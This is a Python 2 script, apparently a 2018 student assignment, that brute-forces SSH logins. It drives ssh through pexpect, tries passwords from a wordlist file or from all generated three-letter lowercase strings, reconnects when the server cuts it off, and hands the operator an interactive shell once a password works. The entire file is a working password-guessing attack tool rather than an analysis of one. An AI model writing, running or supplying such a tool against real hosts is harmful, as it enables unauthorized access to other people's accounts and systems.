#!/usr/bin/python2
#By: Brandon Cocanig
#Date due: 2/19/18 11:59:59
#about: uses ssh to brute force weak passwords

# using pexpect to automatically log in to localhost using SSH
import pexpect
# using sys to get the arguments
import sys

#blank vars that will get filled later.
filepath=""
user = ""
host = ""
password = ""




#start of login in stuff ------
def login(host, user, password, wordlist):
	print "the host is:", host
	print "the user is:", user
	print "---------"
	# construct the login string "ssh newuser@localhost"
	connStr = 'ssh ' + user + '@' + host

	# use "spawn" to create process
	child = pexpect.spawn(connStr)

	##ret = child.expect(['password:'])		# ret is the index of the thing it found. We only have one thing though
	##print "Found password prompt"

	#start password guessin loop
	i=0
	while i < len(wordlist):
		print "trying password:", wordlist[i]
		password = (wordlist[i])
		i = i + 1
		ret = child.expect(['password:'])
		if ret == 0:
			child.sendline(password)
		# expect the login prompt
		ret = child.expect(['\$', 'try', 'publickey,', pexpect.EOF])

		# Treats input data as reading from a file.

		if ret == 0:
			# if the code gets this far, it succeeded.
			print "Found command prompt; We're in!"
			child.sendline()	# Extra return needed to get to the prompt
			child.interact()	# give the keyboard back to the user
			sys.exit(0)
		elif ret == 1:
			print "Password didn't work. Sorry."
		elif ret == 2:
			print "ssh has been kicked for to many passwords, creating a new session..."
			i = i-1  # have to step back one, otherwise the last tried password wont get checked
			child = pexpect.spawn(connStr)
		elif ret == 3:
			print "Connection severed."
			#sys.exit(0)
			# wouldn't do kill because EOF means process ended.
	print "end of given words/generated letters"
	# end of login in stuff ------------------


#start of password list reader --------------

def filereader(filepath):
	wordlist = []
	
	print "loading file", filepath, "now...."
	passwordsFilePath = filepath
	with open(passwordsFilePath) as f:
		wordlist = f.read().splitlines()
		f.close()
	    	#print(wordlist[2])
		return wordlist

# end of password list reader --------------




#start of Lowecase generator --------------
def lowcasegen():
	#store all possible permutations inside an empty array
	wordlist = []
	#inputing a list of all possible letters, can add extra characters such as numbers and special
	#higer priority will be first ie. a, lower priority will be last ie. z
	dictionary = ["a", "b", "c", "d", "e", "f", "g", "h", "i",
		          "j", "k", "l", "m", "n", "o", "p", "q", "r",
		          "s", "t", "u", "v", "w", "x", "y", "z"]


	for firstCharacter in dictionary:
	    
	    for secondCharacter in dictionary:
		   
		   for thirdCharacter in dictionary:
		       
		       wordlist.append(firstCharacter+secondCharacter+thirdCharacter)

	#now there's a list you can use it however you want
	#print(wordlist[0])
	return wordlist


#end of Lowecase generator -----------



#start arg handling -------------------

#going under the assumption that possible num of accepatble args is
# 4 and 3 and 5
#print (sys.argv)
#print len(sys.argv)

if len(sys.argv) == 3 or len(sys.argv) == 4 or len(sys.argv) == 5:
	print "num of argvs is", len(sys.argv), " which is acceptable..."
else: 
	print "error num of args, exiting..."
	sys.exit(0)

#used to enter file mode
if sys.argv[1] == "-f":
	#the next arg to file has to be the file path
	filepath = sys.argv[2]
	host = sys.argv[3]
	user = sys.argv[4]
	mode = "fileselection"


#used to enter gen mode
if sys.argv[1] == "-g":
	host = sys.argv[2]
	user = sys.argv[3]
	mode = "lowergen"

print "you entered", mode, "as the mode...."


#end arg handling -------------------

wordlist = []

# finding out which function to call based on the arguments
if mode == "lowergen":
	wordlist = lowcasegen()

if mode == "fileselection":
	wordlist = filereader(filepath)

login(host, user, password, wordlist)

